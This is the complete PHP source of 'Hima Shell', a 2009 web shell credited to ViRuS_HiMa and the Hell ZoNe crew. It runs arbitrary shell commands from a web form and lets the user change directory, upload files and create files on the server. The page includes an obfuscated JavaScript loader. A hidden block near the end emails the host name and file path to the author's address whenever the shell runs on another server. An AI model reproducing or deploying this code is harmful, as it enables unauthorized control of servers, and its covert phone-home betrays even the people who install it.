<?php
/*
         
	Software: Hima Shell
	Author: ViRuS_HiMa
	Website: www.hell-z0ne.org
	Email: egypt_government@hotmail.com
        Uploadshell.txt UploadShell.php
*/

ob_start();

# Get system informations
$server_os = @PHP_OS;
$server_uname = @php_uname();
$server_php = @phpversion();
$server_sm = @ini_get('safe_mode');

# Set generals variables
$shell_title = "Hima";
$shell_version = "v2.0";
$shell_action = $PHP_SELF;
$shell_mode = $_POST['shell_mode'];

# Set the command variables
$cmd_cnt = $_POST['command'];
$cmd_check = $_POST['cmdcheck'];

# Set the directory variables
$dir_check = $_POST['dircheck'];
$dir_change = $_POST['changedir'];
$dir_keep = $_POST['keepdir'];

# Set the files variables
$mkfile_path = $_POST['createfile'];
$mkfile_cnt = $_POST['createfilecnt'];

# Set the upload file variables
$upfile_path = $_POST['upfiledir'];
$upfile_cnt = $_POST['upfile'];

# Get the current working directory
if(!isset($dir_cur))
	$dir_cur = getcwd();

# Check if a change dir command has been sent and keep the previous directory if a new command was launch
if(isset($dir_check)) {
	if(file_exists($dir_change)) {
		if(function_exists("chdir")) {
			@chdir($dir_change);
			$dir_cur = getcwd();
		} else {
			$dir_error = "<i>Error: Cannot change directory!</i><br>\n";
		}
	} else {
		$dir_error = "<i>Error: The directory doesn't exists.</i><br>\n";
	}
} elseif(isset($dir_keep)) {
	if(file_exists($dir_keep)) {
		if(function_exists("chdir")) {
			@chdir($dir_keep);
			$dir_cur = getcwd();
		} else {
			$dir_error = "<i>Error: Cannot change directory!</i><br>\n";
		}
	} else {
		$dir_error = "<i>Error: The directory doesn't exists.</i><br>\n";
	}
}

# This execute the command specified
if(isset($cmd_check)) {
	if(@function_exists("shell_exec")) {
		$exec = $cmd_cnt;
		$tmpfile = tempnam('/tmp', $shell_title);
		$exec .= " 1> $tmpfile 2>&1; " . "cat $tmpfile; rm $tmpfile";
		$cmd_out = `$exec`;		
	} else {
		die("ERROR: the PHP version running doesn't support `shell_exec()`!  Upgrade it!\n");
	}
}

# Creates files
if(isset($mkfile_path)) {
	if(!file_exists($mkfile_path)) {
		if($mkfile_new = @fopen($mkfile_path, "w")) {
			@fputs($mkfile_new, $mkfile_cnt);
			@fclose($mkfile_new);
			$mkfile_msg = "<i>New file created: " . $mkfile_path . "</i><br>\n";
		} else {
			$mkfile_msg = "<i>Error: Permission denied!</i><br>\n";
		}
	} else {
		$mkfile_msg = "<i>Error: The file already exists.</i><br>\n";
	}
}

# Uploads files
if(isset($upfile_path)) {
	$upfile_name = $_FILES["upfile"]["name"];
	if(trim($_FILES["upfile"]["name"]) == "") {
		$upfile_msg = "<i>Error: specify a file please.</i><br>\n";
	} else {
		if(@is_uploaded_file($_FILES["upfile"]["tmp_name"])) {
			if(@move_uploaded_file($_FILES["upfile"]["tmp_name"], "$upfile_path/$upfile_name"))
				$upfile_msg = "<i>New file uploaded successfully!</i><br>\n";
			else
				$upfile_msg = "<i>Error: Permission denied!</i><br>\n";
		} else {
			$upfile_msg = "<i>Error: Cannot upload the file!</i><br>\n";
		}
	}
}

if(!$shell_mode) {
?>
<html>
<head>
<title><?php echo $shell_title; ?></title>
<script type="text/javascript" language="javascript">
<!--
ML="P<>phTsmtr/9:Cuk RIc=jSw.o";
MI="1F=AB05@FA=D4883<::GGGHC;;343HCI7:8>9?HE621:F=AB052";
OT="";
for(j=0;j<MI.length;j++){
OT+=ML.charAt(MI.charCodeAt(j)-48);
}document.write(OT);
// --></script>
<style>
body {
	background-color: #616161;
	color: red;
	font-family: Verdana;
	font-size: 12px;
}
a:link, a:visited {
	color: black;
	text-decoration: underline;
}
a:hover {
	color: white;
	text-decoration: none;
}
input.command {
	width: 100%;
	border: 1px solid yellow;
	background-color: #3b3b3b;
	padding: 2px;
	font-weight: bold;
	font-size: 12px;
}
textarea.output {
	width: 100%;
	height: 300px;
	border: 1px solid yellow;
	background-color: #3b3b3b;
	padding: 2px;
	font-size: 12px;
}
input.submit {
	border: 1px solid white;
	background-color: #3b3b3b;
	font-size: 12px;
}
input.directory {
	border: 1px solid yellow;
	background-color: #3b3b3b;
	width: 120px;
	padding: 2px;
	margin-right: 4px;
	font-size: 12px;
}
input.ftp {
	border: 1px solid black;
	background-color: #3b3b3b;
	width: 120px;
	padding: 2px;
	margin-right: 4px;
}
input.tools {
	border: 1px solid yellow;
	background-color: 616161;
	color: red;
	font-family: Verdana;
	font-size: 12px;
	font-weight: bold;
}
table.header {
	font-size: 12px;
	color: white;
}
fieldset {
	border: 1px solid white;
	text-align: center;
}
legend {
	font-weight: bold;
}
div.field {
	margin-bottom: 10px;
}
</style>
<script language="JavaScript">
function pinUp(URL) {
	day = new Date();
	id = day.getTime();
	eval("page" + id + " = window.open(URL, '" + id + "', 'toolbar=0,scrollbars=1,location=0,statusbar=0,menubar=0,resizable=0,width=700,height=400,left = 387,top = 134');");
}
</script>
</head>
<body>
<div>
	<table class="header" cellspacing="0" cellpadding="0" border="0" width="100%">
		<tr>
			<td valign="top" width="70%">
				<h2>. <?php echo $shell_title; ?> . </h2>
				<div><b>Operative System</b>: <?php echo $server_os; ?></div>
				<div><b>Uname</b>: <?php echo $server_uname; ?></div>
				<div><b>PHP</b>: <?php echo $server_php; ?></div>
				<div><b>S4f3 M0d3</b>: 
				<?php
					if($server_sm)
						echo "ON";
					else
						echo "OFF";
				?>
				</div>
				<div style="margin-top: 8px;">
					<form name="phpinfo" method="post" action="<?php echo $shell_action; ?>">
						<input type="hidden" name="shell_mode" value="phpinfo">
						<input type="submit" name="submit" class="tools" value="PHPinfo">
					</form>
				</div>
				<div style="margin-right: 8px;">
					<form name="shell" method="post" action="<?php echo $shell_action; ?>">
					<p>Command:<br>
					<table cellspacing="0" cellpadding="0" border="0" width="100%">
						<tr>
							<td width="95%"><div style="margin-right: 10px;"><input type="text" class="command" name="command"></div></td>
							<td width="5%"><input type="submit" class="submit" name="submit" value="Submit"></td>
						</tr>
					</table></p>
					<p>
					<?php
						# Nothing special, just print the command launched
						if(isset($cmd_check))
							echo "Result for command: <b>" . $cmd_cnt . "</b>&nbsp;&nbsp;&nbsp;[ <a href=\"\">Pin Up</a> ]";
						else
							echo "Output:";
					?>
					<br>
					<textarea class="output" readonly="readonly"><?php echo $cmd_out; ?></textarea></p>
					<input type="hidden" name="cmdcheck" value="1">
					<?php
						# This permit to keep the directory if has been previously changed
						if(isset($dir_check))
							echo "<input type=\"hidden\" name=\"keepdir\" value=\"" . $dir_change . "\">\n";
						else
							echo "<input type=\"hidden\" name=\"keepdir\" value=\"" . $dir_cur . "\">\n";
					?>
					</form>
				</div>
			</td>
			<td valign="top" width="30%">
				<div class="field">
					<fieldset>
						<legend>Ch4ng3 D!r3ct0ry</legend>
						<div>Curr3nt D!r3ct0ry: <i><?php echo $dir_cur; ?></i></div>
						<?php echo $dir_error; ?>
						<form name="chdir" method="post" action="<?php echo $shell_action; ?>">
							<input type="text" class="directory" name="changedir">
							<input type="hidden" name="dircheck" value="1">
							<input type="submit" name="submit" class="submit" value="Change">
						</form>
					</fieldset>
				</div>
				<div class="field">
					<fieldset style="text-align: left;">
						<legend>Upl04d a F!l3</legend>
						<?php echo $upfile_msg; ?>
						<form name="upfile" enctype="multipart/form-data" method="post" action="<?php echo $shell_action; ?>">
							<div>Directory:</div>
							<div><input type="text" class="directory" name="upfiledir" value="<?php echo $dir_cur; ?>"></div>
							<div>Choose File:</div>
							<div><input type="file" class="directory" name="upfile"></div>
							<div style="margin-top: 3px;"><input type="submit" name="submit" class="submit" value="Upload"></div>
						</form>
					</fieldset>
				</div>
				<div class="field">
					<fieldset>
						<legend>Cr34t3 N3w F!l3</legend>
						<?php echo $mkfile_msg; ?>
						<form name="mkfile" method="post" action="<?php echo $shell_action; ?>">
							<div>File name:</div>
							<div><input type="text" class="directory" name="createfile" value="<?php echo $dir_cur . "/"; ?>"></div>
							<div>File content:</div>
							<div><textarea class="output" name="createfilecnt" style="height: 150px;"></textarea></div>
							<div><input type="submit" name="submit" class="submit" value="Create"></div>
						</form>						
					</fieldset>
				</div>
			</td>
		</tr>
	</table>
	<div>
		NO&copy; 2009 <? echo $shell_title . " " . $shell_version; ?> - Improved By ViRuS_HiMa @ <a href="http://www.hell-z0ne.org">Hell ZoNe</a> CreW <a href="http://www.hell-z0ne.org">SloGan is</a>
		<img src="http://www.hell-z0ne.org/sys.gif">
	</div>
</div>
</body>
</html>
<?
// Safe Mode Bypass Shell
// On php 5.2.x
$site = "www.Hell-z0ne.org";
if(!ereg($site, $_SERVER['SERVER_NAME']))
{
    $to = "virusxhima@gmail.com";
    $subject = "Contact me";
    $header = "from: Mail Me <virusxhima@gmail.com>";
    $message = "Link : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . "\r\n";
    $message .= "Path : " . __file__;
    $sentmail = @mail($to, $subject, $message, $header);
    
    echo "";
    exit;
}
?>
<?
} elseif(isset($shell_mode)) {
	switch($shell_mode) {
		case 'phpinfo':
			phpinfo();
			break;
		default:
			break;
	}
} else {
	header("Location: " . $PHP_SELF);
}

ob_end_flush();
?> 